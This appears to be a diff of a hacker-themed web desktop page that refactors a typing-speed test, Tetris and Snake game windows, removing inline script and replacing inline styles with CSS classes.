-  return pool[Math.floor(Math.random() * pool.length)];
-}
-
-function renderTTDisplay(typed){
-  const display = document.getElementById('ttTextDisplay');
-  if(!display) return;
-  let html = '';
-  for(let i = 0; i < ttSnippet.length; i++){
-    const ch = ttSnippet[i];
-    const disp = ch === ' ' ? '&nbsp;' : ch === '\n' ? '<br>' : ch.replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    if(i < typed.length){
-      const correct = typed[i] === ttSnippet[i];
-      html += `<span style="color:${correct ? '#00ff9d' : '#ff3355'};${!correct ? 'background:rgba(255,51,85,0.15);border-radius:2px;' : ''}">${disp}</span>`;
-    } else if(i === typed.length){
-      html += `<span style="color:#c9d1d9;text-decoration:underline;text-decoration-color:var(--accent);animation:tblink 1s step-end infinite;">${disp}</span>`;
-    } else {
-      html += `<span style="color:#2d3748;">${disp}</span>`;
-    }
-  }
-  display.innerHTML = html;
-
-  // Update progress
-  const pct = Math.round((typed.length / ttSnippet.length) * 100);
-  const prog = document.getElementById('ttProgress');
-  if(prog) prog.textContent = pct + '% complete';
-}
-
-function onTTInput(){
-  const input = document.getElementById('ttInput');
-  if(!input || ttFinished) return;
-  const typed = input.value;
-
-  if(!ttActive && typed.length > 0){
-    ttActive = true;
-    ttStartTime = Date.now();
-    ttTimer = setInterval(updateTTTimer, 1000);
-  }
-
-  ttTotalTyped = typed.length;
-  // Count correct chars
-  ttCorrectTyped = 0;
-  for(let i = 0; i < Math.min(typed.length, ttSnippet.length); i++){
-    if(typed[i] === ttSnippet[i]) ttCorrectTyped++;
-  }
-
-  renderTTDisplay(typed);
-  updateTTStats();
-
-  // Check completion
-  if(typed === ttSnippet){
-    finishTypingTest();
-  }
-}
-
-function updateTTTimer(){
-  ttTimeLeft--;
-  const el = document.getElementById('ttTime');
-  if(el){
-    el.textContent = ttTimeLeft;
-    el.style.color = ttTimeLeft <= 10 ? '#ff3355' : '#febc2e';
-  }
-  if(ttTimeLeft <= 0) finishTypingTest();
-}
-
-function updateTTStats(){
-  if(!ttActive || !ttStartTime) return;
-  const elapsed = (Date.now() - ttStartTime) / 1000 / 60; // minutes
-  const wpm = elapsed > 0 ? Math.round((ttCorrectTyped / 5) / elapsed) : 0;
-  const acc = ttTotalTyped > 0 ? Math.round((ttCorrectTyped / ttTotalTyped) * 100) : 100;
-  const wpmEl = document.getElementById('ttWpm');
-  const accEl = document.getElementById('ttAcc');
-  if(wpmEl) wpmEl.textContent = wpm;
-  if(accEl) accEl.textContent = acc + '%';
-}
-
-function finishTypingTest(){
-  if(ttFinished) return;
-  ttFinished = true;
-  clearInterval(ttTimer);
-
-  const elapsed = ttStartTime ? (Date.now() - ttStartTime) / 1000 : 60;
-  const mins = elapsed / 60;
-  const wpm = mins > 0 ? Math.round((ttCorrectTyped / 5) / mins) : 0;
-  const acc = ttTotalTyped > 0 ? Math.round((ttCorrectTyped / ttTotalTyped) * 100) : 100;
-
-  let rank = '[ SCRIPT KIDDIE ]';
-  if(wpm >= 80 && acc >= 95) rank = '[ ELITE HACKER ]';
-  else if(wpm >= 60 && acc >= 90) rank = '[ RED TEAMER ]';
-  else if(wpm >= 40 && acc >= 85) rank = '[ PENTESTER ]';
-  else if(wpm >= 25) rank = '[ ANALYST ]';
-
-  document.getElementById('ttFinalWpm').textContent = wpm + ' WPM';
-  document.getElementById('ttFinalAcc').textContent = acc + '%';
-  document.getElementById('ttFinalTime').textContent = Math.round(elapsed) + 's';
-  document.getElementById('ttFinalRank').textContent = rank;
-
-  const res = document.getElementById('ttResults');
-  if(res){ res.style.display = 'flex'; }
-}
-
-function resetTypingTest(){
-  ttActive = false;
-  ttFinished = false;
-  ttStartTime = null;
-  ttTotalTyped = 0;
-  ttCorrectTyped = 0;
-  ttTimeLeft = 60;
-  clearInterval(ttTimer);
-
-  const input = document.getElementById('ttInput');
-  if(input){ input.value = ''; input.disabled = false; }
-  const timeEl = document.getElementById('ttTime');
-  if(timeEl){ timeEl.textContent = '60'; timeEl.style.color = '#febc2e'; }
-  const wpmEl = document.getElementById('ttWpm');
-  if(wpmEl) wpmEl.textContent = '—';
-  const accEl = document.getElementById('ttAcc');
-  if(accEl) accEl.textContent = '—';
-  const res = document.getElementById('ttResults');
-  if(res) res.style.display = 'none';
-  const prog = document.getElementById('ttProgress');
-  if(prog) prog.textContent = '';
-
-  ttSnippet = getTTSnippet();
-  renderTTDisplay('');
-
-  // Tab key to restart
-  if(input) input.focus();
-}
-
-// Init typing test when window opens (patch openWindow)
-// typing test init handled inside openWindow
-
-// Tab key shortcut in typing test
-document.addEventListener('keydown', e => {
-  if(e.key === 'Tab' && document.activeElement && document.activeElement.id === 'ttInput'){
-    e.preventDefault();
-    resetTypingTest();
-  }
-});
-// ══ END TYPING TEST ══════════════════════════════════════════════
-
-// ══ END BOOT ═════════════════════════════════════════════════════════════════
-
-</script>
-
 
 <!-- Typing Test Window -->
 <div class="window" id="win-typingtest" style="width:700px;height:480px;top:70px;left:160px;display:none;" data-win="typingtest">
@@ -3119,87 +661,79 @@ document.addEventListener('keydown', e => {
     <div class="win-title">⌨️ hack.exe — Hacker Typing Challenge</div>
     <div class="win-title-right"></div>
   </div>
-  <div class="win-body" style="background:#0a0d0f;display:flex;flex-direction:column;overflow:hidden;">
+  <div class="win-body game-body">
 
     <!-- Header stats bar -->
-    <div id="ttHeader" style="display:flex;align-items:center;gap:18px;padding:8px 16px;border-bottom:1px solid #1a2230;flex-shrink:0;background:#0d1117;">
-      <div style="font-size:0.65rem;color:#6e7681;letter-spacing:0.12em;">WPM</div>
-      <div id="ttWpm" style="font-size:1.1rem;color:var(--accent);font-weight:700;min-width:38px;">—</div>
-      <div style="width:1px;height:20px;background:#30363d;"></div>
-      <div style="font-size:0.65rem;color:#6e7681;letter-spacing:0.12em;">ACC</div>
-      <div id="ttAcc" style="font-size:1.1rem;color:var(--accent);font-weight:700;min-width:44px;">—</div>
-      <div style="width:1px;height:20px;background:#30363d;"></div>
-      <div style="font-size:0.65rem;color:#6e7681;letter-spacing:0.12em;">TIME</div>
-      <div id="ttTime" style="font-size:1.1rem;color:#febc2e;font-weight:700;font-variant-numeric:tabular-nums;min-width:32px;">60</div>
-      <div style="flex:1;"></div>
+    <div id="ttHeader" class="game-header">
+      <div class="game-label">WPM</div>
+      <div id="ttWpm" class="game-stat">—</div>
+      <div class="game-divider-v"></div>
+      <div class="game-label">ACC</div>
+      <div id="ttAcc" class="game-stat" style="min-width:44px;">—</div>
+      <div class="game-divider-v"></div>
+      <div class="game-label">TIME</div>
+      <div id="ttTime" class="game-stat game-stat-amber" style="min-width:32px;">60</div>
+      <div class="game-spacer"></div>
       <div id="ttDiff" style="display:flex;gap:5px;">
-        <button onclick="setTTDiff('easy')" id="ttDiffEasy" style="padding:3px 10px;border-radius:4px;font-family:inherit;font-size:0.65rem;cursor:pointer;border:1px solid rgba(0,255,157,0.3);background:rgba(0,255,157,0.12);color:var(--accent);letter-spacing:0.05em;">EASY</button>
-        <button onclick="setTTDiff('hard')" id="ttDiffHard" style="padding:3px 10px;border-radius:4px;font-family:inherit;font-size:0.65rem;cursor:pointer;border:1px solid #30363d;background:transparent;color:#6e7681;letter-spacing:0.05em;">HARD</button>
-        <button onclick="setTTDiff('elite')" id="ttDiffElite" style="padding:3px 10px;border-radius:4px;font-family:inherit;font-size:0.65rem;cursor:pointer;border:1px solid #30363d;background:transparent;color:#6e7681;letter-spacing:0.05em;">ELITE</button>
+        <button onclick="setTTDiff('easy')" id="ttDiffEasy" class="game-btn-tab active">EASY</button>
+        <button onclick="setTTDiff('hard')" id="ttDiffHard" class="game-btn-tab">HARD</button>
+        <button onclick="setTTDiff('elite')" id="ttDiffElite" class="game-btn-tab">ELITE</button>
       </div>
-      <button onclick="resetTypingTest()" style="padding:4px 12px;border-radius:4px;font-family:inherit;font-size:0.68rem;cursor:pointer;border:1px solid #30363d;background:transparent;color:#6e7681;letter-spacing:0.06em;">↺ RESET</button>
+      <button onclick="resetTypingTest()" class="game-btn">↺ RESET</button>
     </div>
 
     <!-- Text display area -->
-    <div style="flex:1;overflow:hidden;display:flex;flex-direction:column;padding:16px 20px 0;">
+    <div class="game-text-area">
       <!-- Prompt label -->
-      <div id="ttPromptLabel" style="font-size:0.58rem;color:#6e7681;letter-spacing:0.18em;margin-bottom:8px;">[ BREACH CODE — TYPE TO HACK ]</div>
+      <div id="ttPromptLabel" class="game-prompt-label">[ BREACH CODE — TYPE TO HACK ]</div>
       <!-- The code to type -->
-      <div id="ttTextDisplay" style="font-size:0.95rem;line-height:1.9;color:#4a5568;letter-spacing:0.03em;word-break:break-all;user-select:none;font-family:'Fira Code',monospace;flex:1;overflow-y:auto;"></div>
+      <div id="ttTextDisplay" class="game-code-display"></div>
     </div>
 
     <!-- Input area -->
-    <div style="padding:12px 20px 16px;border-top:1px solid #1a2230;flex-shrink:0;background:#0d1117;">
-      <div style="position:relative;">
-        <textarea id="ttInput"
-          rows="2"
-          placeholder="[ Click here and start typing to begin breach... ]"
-          spellcheck="false" autocorrect="off" autocapitalize="none" autocomplete="off"
-          style="width:100%;background:rgba(0,255,157,0.03);border:1px solid rgba(0,255,157,0.2);border-radius:6px;
-                 padding:10px 14px;font-family:'Fira Code',monospace;font-size:0.88rem;color:var(--accent);
-                 outline:none;resize:none;caret-color:var(--accent);line-height:1.5;letter-spacing:0.03em;
-                 transition:border-color 0.2s;"
-          oninput="onTTInput()"
-          onfocus="this.style.borderColor='rgba(0,255,157,0.5)'"
-          onblur="this.style.borderColor='rgba(0,255,157,0.2)'"
-        ></textarea>
-      </div>
+    <div class="game-input-wrap">
+      <textarea id="ttInput"
+        class="game-input"
+        rows="2"
+        placeholder="[ Click here and start typing to begin breach... ]"
+        spellcheck="false" autocorrect="off" autocapitalize="none" autocomplete="off"
+        oninput="onTTInput()"
+      ></textarea>
       <!-- Mini keyboard hint -->
-      <div style="display:flex;gap:12px;align-items:center;margin-top:8px;">
-        <div style="font-size:0.6rem;color:#30363d;letter-spacing:0.1em;">TAB = restart &nbsp;|&nbsp; ESC = reset difficulty</div>
-        <div style="flex:1;"></div>
-        <div id="ttProgress" style="font-size:0.6rem;color:#6e7681;letter-spacing:0.1em;"></div>
+      <div class="game-hint-row">
+        <div class="game-hint">TAB = restart &nbsp;|&nbsp; ESC = reset difficulty</div>
+        <div class="game-spacer"></div>
+        <div id="ttProgress" class="game-progress"></div>
       </div>
     </div>
 
     <!-- Results overlay -->
-    <div id="ttResults" style="display:none;position:absolute;inset:0;background:rgba(10,13,15,0.97);flex-direction:column;align-items:center;justify-content:center;gap:14px;z-index:20;">
-      <div style="font-size:0.65rem;color:#6e7681;letter-spacing:0.22em;">[ BREACH COMPLETE ]</div>
-      <div style="font-size:2.4rem;color:var(--accent);font-weight:700;text-shadow:0 0 30px var(--accent);" id="ttFinalWpm">0 WPM</div>
-      <div style="display:flex;gap:24px;margin-top:4px;">
-        <div style="text-align:center;">
-          <div style="font-size:1.2rem;color:var(--accent);" id="ttFinalAcc">0%</div>
-          <div style="font-size:0.6rem;color:#6e7681;margin-top:2px;">ACCURACY</div>
+    <div id="ttResults" class="game-overlay">
+      <div class="game-overlay-caption">[ BREACH COMPLETE ]</div>
+      <div class="game-overlay-big" id="ttFinalWpm">0 WPM</div>
+      <div class="game-result-row">
+        <div class="game-result-col">
+          <div class="game-result-val" id="ttFinalAcc">0%</div>
+          <div class="game-result-label">ACCURACY</div>
         </div>
-        <div style="text-align:center;">
-          <div style="font-size:1.2rem;color:#febc2e;" id="ttFinalTime">0s</div>
-          <div style="font-size:0.6rem;color:#6e7681;margin-top:2px;">TIME</div>
+        <div class="game-result-col">
+          <div class="game-result-val-amber" id="ttFinalTime">0s</div>
+          <div class="game-result-label">TIME</div>
         </div>
-        <div style="text-align:center;">
-          <div style="font-size:1.2rem;color:#58a6ff;" id="ttFinalRank">—</div>
-          <div style="font-size:0.6rem;color:#6e7681;margin-top:2px;">RANK</div>
+        <div class="game-result-col">
+          <div class="game-result-val-blue" id="ttFinalRank">—</div>
+          <div class="game-result-label">RANK</div>
         </div>
       </div>
-      <div style="display:flex;gap:10px;margin-top:10px;">
-        <button onclick="resetTypingTest()" style="padding:9px 26px;border-radius:6px;font-family:inherit;font-size:0.8rem;font-weight:700;cursor:pointer;background:var(--accent);color:#000;border:none;letter-spacing:0.06em;">↺ TRY AGAIN</button>
-        <button onclick="setTTDiff(ttCurrentDiff==='elite'?'easy':ttCurrentDiff==='hard'?'elite':'hard');resetTypingTest()" style="padding:8px 18px;border-radius:6px;font-family:inherit;font-size:0.72rem;cursor:pointer;background:transparent;color:#6e7681;border:1px solid #30363d;">CHANGE DIFF</button>
+      <div class="game-btn-row">
+        <button onclick="resetTypingTest()" class="game-btn-primary">↺ TRY AGAIN</button>
+        <button onclick="setTTDiff(ttCurrentDiff==='elite'?'easy':ttCurrentDiff==='hard'?'elite':'hard');resetTypingTest()" class="game-btn-ghost">CHANGE DIFF</button>
       </div>
     </div>
 
   </div>
   <div class="win-resize" onmousedown="startResize(event,'win-typingtest')" ontouchstart="startResizeTouch(event,'win-typingtest')"></div>
 </div>
-
 
 <!-- Tetris Window -->
 <div class="window" id="win-tetris" style="width:520px;height:580px;top:60px;left:150px;display:none;" data-win="tetris">
@@ -3213,109 +747,69 @@ document.addEventListener('keydown', e => {
     <div class="win-title-right"></div>
   </div>
 
-  <div class="win-body" style="background:#060a0d;position:relative;overflow:hidden;">
+  <div class="win-body game-body-dark">
 
     <!-- ═══ IDLE SCREEN (fullscreen animated demo) ═══ -->
-    <div id="tetIdleScreen" style="position:absolute;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;overflow:hidden;">
-      <canvas id="tetDemoCanvas" style="position:absolute;inset:0;width:100%;height:100%;opacity:0.5;pointer-events:none;"></canvas>
-      <div style="position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;gap:14px;">
-        <div style="font-size:0.65rem;color:var(--accent);letter-spacing:0.28em;opacity:0.7;">— BLOCK DROP —</div>
-        <div style="font-size:2.8rem;font-weight:700;letter-spacing:0.1em;line-height:1;
-                    background:linear-gradient(135deg,#00f5ff 0%,#00ff9d 50%,#b06fff 100%);
-                    -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
-                    filter:drop-shadow(0 0 18px rgba(0,255,157,0.5));">TETRIS</div>
-        <div style="font-size:0.68rem;color:rgba(200,210,220,0.7);letter-spacing:0.1em;">Press SPACE or click to play</div>
-        <button id="tetStartBtn" onclick="tetrisStartOrRestart()"
-          style="margin-top:6px;padding:12px 44px;border-radius:6px;font-family:inherit;font-size:0.85rem;
-                 font-weight:700;cursor:pointer;background:var(--accent);color:#000;border:none;
-                 letter-spacing:0.1em;box-shadow:0 0 24px rgba(0,255,157,0.45);transition:transform 0.12s,box-shadow 0.12s;"
-          onmouseover="this.style.transform='scale(1.06)';this.style.boxShadow='0 0 36px rgba(0,255,157,0.7)'"
-          onmouseout="this.style.transform='';this.style.boxShadow='0 0 24px rgba(0,255,157,0.45)'">
-          ▶ START
-        </button>
-        <div style="font-size:0.6rem;color:#6e7681;letter-spacing:0.12em;margin-top:2px;">
-          BEST &nbsp;<span id="tetBestIdle" style="color:rgba(0,255,157,0.6);font-weight:700;">0</span>
-        </div>
+    <div id="tetIdleScreen" class="game-idle-screen">
+      <canvas id="tetDemoCanvas" class="game-idle-canvas"></canvas>
+      <div class="game-idle-content">
+        <div class="game-idle-tag">— BLOCK DROP —</div>
+        <div class="game-idle-title">TETRIS</div>
+        <div class="game-idle-sub">Press SPACE or click to play</div>
+        <button id="tetStartBtn" onclick="tetrisStartOrRestart()" class="game-btn-start">▶ START</button>
+        <div class="game-idle-best">BEST &nbsp;<span id="tetBestIdle">0</span></div>
       </div>
     </div>
 
     <!-- ═══ GAME SCREEN ═══ -->
-    <div id="tetGameScreen" style="display:none;width:100%;height:100%;flex-direction:row;">
+    <div id="tetGameScreen" class="tet-screen">
 
       <!-- Canvas -->
-      <div style="flex:1;display:flex;align-items:center;justify-content:center;padding:12px 8px 12px 14px;">
-        <canvas id="tetrisCanvas" style="border:1px solid rgba(0,255,157,0.2);box-shadow:0 0 20px rgba(0,255,157,0.08);image-rendering:pixelated;"></canvas>
+      <div class="tet-canvas-wrap">
+        <canvas id="tetrisCanvas" class="tet-canvas"></canvas>
       </div>
 
       <!-- Side panel -->
-      <div style="width:130px;flex-shrink:0;display:flex;flex-direction:column;padding:14px 12px;gap:14px;border-left:1px solid #1a2230;">
+      <div class="tet-side">
         <div>
-          <div style="font-size:0.58rem;color:#6e7681;letter-spacing:0.14em;margin-bottom:6px;">NEXT</div>
-          <canvas id="tetrisNext" width="80" height="80" style="border:1px solid #1a2230;border-radius:4px;background:#0a0d10;"></canvas>
+          <div class="tet-side-label">NEXT</div>
+          <canvas id="tetrisNext" width="80" height="80" class="tet-next-canvas"></canvas>
         </div>
         <div>
-          <div style="font-size:0.58rem;color:#6e7681;letter-spacing:0.14em;margin-bottom:3px;">SCORE</div>
-          <div id="tetScore" style="font-size:1.3rem;color:var(--accent);font-weight:700;font-variant-numeric:tabular-nums;">0</div>
+          <div class="tet-side-label">SCORE</div>
+          <div id="tetScore" class="tet-side-val-score">0</div>
         </div>
         <div>
-          <div style="font-size:0.58rem;color:#6e7681;letter-spacing:0.14em;margin-bottom:3px;">LEVEL</div>
-          <div id="tetLevel" style="font-size:1.1rem;color:#febc2e;font-weight:700;">1</div>
+          <div class="tet-side-label">LEVEL</div>
+          <div id="tetLevel" class="tet-side-val">1</div>
         </div>
         <div>
-          <div style="font-size:0.58rem;color:#6e7681;letter-spacing:0.14em;margin-bottom:3px;">LINES</div>
-          <div id="tetLines" style="font-size:1.1rem;color:#58a6ff;font-weight:700;">0</div>
+          <div class="tet-side-label">LINES</div>
+          <div id="tetLines" class="tet-side-val-blue">0</div>
         </div>
         <div>
-          <div style="font-size:0.58rem;color:#6e7681;letter-spacing:0.14em;margin-bottom:3px;">BEST</div>
-          <div id="tetBest" style="font-size:0.95rem;color:rgba(0,255,157,0.6);font-weight:600;">0</div>
+          <div class="tet-side-label">BEST</div>
+          <div id="tetBest" class="tet-side-val-best">0</div>
         </div>
-        <div style="flex:1;"></div>
+        <div class="game-spacer"></div>
         <div style="display:flex;flex-direction:column;gap:5px;">
-          <div style="display:flex;justify-content:space-between;align-items:center;">
-            <span style="background:#1a2230;border:1px solid #2d3748;border-radius:3px;padding:1px 5px;color:#c9d1d9;font-size:0.6rem;">← →</span>
-            <span style="color:#6e7681;font-size:0.58rem;">Move</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;">
-            <span style="background:#1a2230;border:1px solid #2d3748;border-radius:3px;padding:1px 5px;color:#c9d1d9;font-size:0.6rem;">↑</span>
-            <span style="color:#6e7681;font-size:0.58rem;">Rotate</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;">
-            <span style="background:#1a2230;border:1px solid #2d3748;border-radius:3px;padding:1px 5px;color:#c9d1d9;font-size:0.6rem;">↓</span>
-            <span style="color:#6e7681;font-size:0.58rem;">Soft drop</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;">
-            <span style="background:#1a2230;border:1px solid #2d3748;border-radius:3px;padding:1px 5px;color:#c9d1d9;font-size:0.6rem;">SPC</span>
-            <span style="color:#6e7681;font-size:0.58rem;">Hard drop</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;align-items:center;">
-            <span style="background:#1a2230;border:1px solid #2d3748;border-radius:3px;padding:1px 5px;color:#c9d1d9;font-size:0.6rem;">P</span>
-            <span style="color:#6e7681;font-size:0.58rem;">Pause</span>
-          </div>
+          <div class="tet-key-row"><span class="tet-key-badge">← →</span><span class="tet-key-desc">Move</span></div>
+          <div class="tet-key-row"><span class="tet-key-badge">↑</span><span class="tet-key-desc">Rotate</span></div>
+          <div class="tet-key-row"><span class="tet-key-badge">↓</span><span class="tet-key-desc">Soft drop</span></div>
+          <div class="tet-key-row"><span class="tet-key-badge">SPC</span><span class="tet-key-desc">Hard drop</span></div>
+          <div class="tet-key-row"><span class="tet-key-badge">P</span><span class="tet-key-desc">Pause</span></div>
         </div>
-        <button id="tetBtn" onclick="tetrisStartOrRestart()"
-          style="padding:7px 0;border-radius:5px;font-family:inherit;font-size:0.7rem;font-weight:700;
-                 cursor:pointer;background:rgba(0,255,157,0.12);color:var(--accent);
-                 border:1px solid rgba(0,255,157,0.3);letter-spacing:0.06em;width:100%;">
-          ⏸ PAUSE
-        </button>
+        <button id="tetBtn" onclick="tetrisStartOrRestart()" class="game-btn-side">⏸ PAUSE</button>
       </div>
     </div>
 
     <!-- Pause / Game Over overlay -->
-    <div id="tetOverlay" style="display:none;position:absolute;inset:0;background:rgba(6,10,13,0.88);z-index:20;flex-direction:column;align-items:center;justify-content:center;gap:14px;">
-      <div id="tetOverlayTitle" style="font-size:2rem;color:var(--accent);font-weight:700;letter-spacing:0.14em;">PAUSED</div>
-      <div id="tetOverlaySub" style="font-size:0.72rem;color:#6e7681;letter-spacing:0.1em;"></div>
-      <div style="display:flex;gap:10px;margin-top:6px;">
-        <button onclick="tetrisStartOrRestart()"
-          style="padding:10px 30px;border-radius:6px;font-family:inherit;font-size:0.8rem;font-weight:700;
-                 cursor:pointer;background:var(--accent);color:#000;border:none;letter-spacing:0.08em;">
-          ▶ RESUME
-        </button>
-        <button onclick="tetrisBackToMenu()"
-          style="padding:9px 20px;border-radius:6px;font-family:inherit;font-size:0.74rem;
-                 cursor:pointer;background:transparent;color:#6e7681;border:1px solid #30363d;">
-          ⌂ MENU
-        </button>
+    <div id="tetOverlay" class="game-overlay" style="background:rgba(6,10,13,0.88);">
+      <div id="tetOverlayTitle" class="tet-overlay-title">PAUSED</div>
+      <div id="tetOverlaySub" class="tet-overlay-sub"></div>
+      <div class="game-btn-row">
+        <button onclick="tetrisStartOrRestart()" class="game-btn-primary">▶ RESUME</button>
+        <button onclick="tetrisBackToMenu()" class="game-btn-ghost">⌂ MENU</button>
       </div>
     </div>
 
@@ -3340,37 +834,24 @@ document.addEventListener('keydown', e => {
     <div style="flex:1;display:flex;flex-direction:column;position:relative;min-width:0;">
 
       <!-- Snake Idle / Name modal -->
-      <div id="snakeNameModal" style="position:absolute;inset:0;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:0;z-index:10;overflow:hidden;">
+      <div id="snakeNameModal" class="snake-modal">
 
         <!-- Animated snake canvas background -->
-        <canvas id="snakeDemoCanvas" style="position:absolute;inset:0;width:100%;height:100%;pointer-events:none;opacity:0.6;"></canvas>
+        <canvas id="snakeDemoCanvas" class="game-idle-canvas" style="opacity:0.6;"></canvas>
 
         <!-- Content -->
-        <div style="position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;gap:12px;padding:24px;">
-          <div style="font-size:0.65rem;color:var(--accent);letter-spacing:0.28em;opacity:0.7;">— SLITHERING SINCE 1976 —</div>
-          <div style="font-size:2.8rem;font-weight:700;letter-spacing:0.1em;line-height:1;
-                      background:linear-gradient(135deg,#00ff9d 0%,#00f5ff 50%,#28c840 100%);
-                      -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
-                      filter:drop-shadow(0 0 18px rgba(0,255,157,0.5));">SNAKE</div>
-          <div style="font-size:0.68rem;color:rgba(200,210,220,0.6);letter-spacing:0.1em;">Enter your callsign to play</div>
+        <div class="snake-modal-content">
+          <div class="game-idle-tag">— SLITHERING SINCE 1976 —</div>
+          <div class="snake-title">SNAKE</div>
+          <div class="game-idle-sub" style="color:rgba(200,210,220,0.6);">Enter your callsign to play</div>
 
           <input id="snakeNameInput" type="text" maxlength="12" placeholder="player01" autocomplete="off" spellcheck="false"
+            class="snake-name-input"
             oninput="this.value=this.value.replace(/[^a-zA-Z0-9]/g,'')"
-            onkeydown="if(event.key==='Enter')startSnakeGame()"
-            style="background:rgba(0,255,157,0.06);border:1px solid rgba(0,255,157,0.5);border-radius:6px;
-                   padding:10px 16px;font-family:inherit;font-size:1rem;color:var(--accent);
-                   outline:none;text-align:center;width:190px;caret-color:var(--accent);
-                   box-shadow:0 0 12px rgba(0,255,157,0.15);margin-top:4px;">
-          <div id="snakeNameErr" style="font-size:0.63rem;color:#ff3355;min-height:14px;text-align:center;"></div>
+            onkeydown="if(event.key==='Enter')startSnakeGame()">
+          <div id="snakeNameErr" class="snake-err"></div>
 
-          <button onclick="startSnakeGame()"
-            style="padding:12px 44px;border-radius:6px;font-family:inherit;font-size:0.85rem;font-weight:700;
-                   cursor:pointer;background:var(--accent);color:#000;border:none;letter-spacing:0.1em;
-                   box-shadow:0 0 24px rgba(0,255,157,0.45);transition:transform 0.12s,box-shadow 0.12s;"
-            onmouseover="this.style.transform='scale(1.06)';this.style.boxShadow='0 0 36px rgba(0,255,157,0.7)'"
-            onmouseout="this.style.transform='';this.style.boxShadow='0 0 24px rgba(0,255,157,0.45)'">
-            ▶ START
-          </button>
+          <button onclick="startSnakeGame()" class="game-btn-start">▶ START</button>
 
           <div style="font-size:0.58rem;color:#4a5568;text-align:center;line-height:2;margin-top:2px;">
             Arrow Keys / WASD &nbsp;·&nbsp; P = Pause
@@ -3379,70 +860,71 @@ document.addEventListener('keydown', e => {
       </div>
 
       <!-- HUD -->
-      <div id="snakeHUD" style="display:none;justify-content:space-between;align-items:center;padding:6px 12px;border-bottom:1px solid #151515;flex-shrink:0;font-size:0.67rem;">
-        <span style="color:var(--muted);">👤 <span id="snakePlayerLabel" style="color:var(--accent);font-weight:700;"></span></span>
-        <span style="color:var(--muted);">SCORE <span id="snakeScoreLabel" style="color:var(--accent);font-weight:700;">0</span></span>
-        <span style="color:var(--muted);">BEST <span id="snakeHiLabel" style="color:var(--accent);">0</span></span>
+      <div id="snakeHUD" class="snake-hud">
+        <span class="snake-hud-key">👤 <span id="snakePlayerLabel" class="snake-hud-val"></span></span>
+        <span class="snake-hud-key">SCORE <span id="snakeScoreLabel" class="snake-hud-val">0</span></span>
+        <span class="snake-hud-key">BEST <span id="snakeHiLabel" style="color:var(--accent);">0</span></span>
       </div>
 
       <!-- Canvas -->
-      <div id="snakeCanvasWrap" style="display:none;flex:1;align-items:center;justify-content:center;background:#000;position:relative;">
-        <canvas id="snakeCanvas" style="display:block;image-rendering:pixelated;image-rendering:crisp-edges;"></canvas>
+      <div id="snakeCanvasWrap" class="snake-canvas-wrap">
+        <canvas id="snakeCanvas" class="snake-canvas"></canvas>
         <!-- Pause overlay -->
-        <div id="snakePauseOverlay" style="display:none;position:absolute;inset:0;background:rgba(0,0,0,0.78);align-items:center;justify-content:center;flex-direction:column;gap:10px;z-index:5;">
+        <div id="snakePauseOverlay" class="snake-overlay snake-pause-overlay">
           <div style="font-size:1.4rem;color:var(--accent);letter-spacing:0.12em;">PAUSED</div>
           <div style="font-size:0.63rem;color:var(--muted);">Press P to resume</div>
           <!-- Mobile d-pad -->
           <div id="snakeDpad" style="display:none;margin-top:10px;user-select:none;">
-            <div style="display:grid;grid-template-columns:40px 40px 40px;grid-template-rows:40px 40px;gap:4px;">
+            <div class="dpad-grid">
               <div></div>
-              <button onclick="snakeMobileDir(0,-1)" style="background:rgba(var(--accent-rgb),0.12);border:1px solid rgba(var(--accent-rgb),0.3);border-radius:6px;color:var(--accent);font-size:1rem;cursor:pointer;">▲</button>
+              <button onclick="snakeMobileDir(0,-1)" class="dpad-btn">▲</button>
               <div></div>
-              <button onclick="snakeMobileDir(-1,0)" style="background:rgba(var(--accent-rgb),0.12);border:1px solid rgba(var(--accent-rgb),0.3);border-radius:6px;color:var(--accent);font-size:1rem;cursor:pointer;">◀</button>
-              <button onclick="snakeMobileDir(0,0)" style="background:rgba(var(--accent-rgb),0.12);border:1px solid rgba(var(--accent-rgb),0.3);border-radius:6px;color:var(--accent);font-size:0.55rem;cursor:pointer;letter-spacing:0">P</button>
-              <button onclick="snakeMobileDir(1,0)" style="background:rgba(var(--accent-rgb),0.12);border:1px solid rgba(var(--accent-rgb),0.3);border-radius:6px;color:var(--accent);font-size:1rem;cursor:pointer;">▶</button>
+              <button onclick="snakeMobileDir(-1,0)" class="dpad-btn">◀</button>
+              <button onclick="snakeMobileDir(0,0)" class="dpad-btn dpad-btn-p">P</button>
+              <button onclick="snakeMobileDir(1,0)" class="dpad-btn">▶</button>
               <div></div>
-              <button onclick="snakeMobileDir(0,1)" style="background:rgba(var(--accent-rgb),0.12);border:1px solid rgba(var(--accent-rgb),0.3);border-radius:6px;color:var(--accent);font-size:1rem;cursor:pointer;">▼</button>
+              <button onclick="snakeMobileDir(0,1)" class="dpad-btn">▼</button>
               <div></div>
             </div>
           </div>
         </div>
         <!-- Dead overlay -->
-        <div id="snakeDeadOverlay" style="display:none;position:absolute;inset:0;background:rgba(0,0,0,0.88);align-items:center;justify-content:center;flex-direction:column;gap:12px;z-index:5;padding:20px;">
-          <div style="font-size:1.6rem;color:var(--danger);letter-spacing:0.1em;">GAME OVER</div>
+        <div id="snakeDeadOverlay" class="snake-overlay snake-dead-overlay">
+          <div class="snake-dead-title">GAME OVER</div>
           <div id="snakeFinalScore" style="font-size:0.85rem;color:var(--accent);text-align:center;"></div>
           <div style="display:flex;gap:8px;margin-top:4px;flex-wrap:wrap;justify-content:center;">
-            <button onclick="snakeRetry()" style="background:var(--accent);color:#000;border:none;border-radius:6px;padding:8px 20px;font-family:inherit;font-size:0.76rem;font-weight:700;cursor:pointer;">↺ Again</button>
-            <button onclick="snakeChangeUser()" style="background:transparent;color:var(--muted);border:1px solid #333;border-radius:6px;padding:7px 14px;font-family:inherit;font-size:0.7rem;cursor:pointer;">Change Player</button>
+            <button onclick="snakeRetry()" class="game-btn-primary" style="padding:8px 20px;">↺ Again</button>
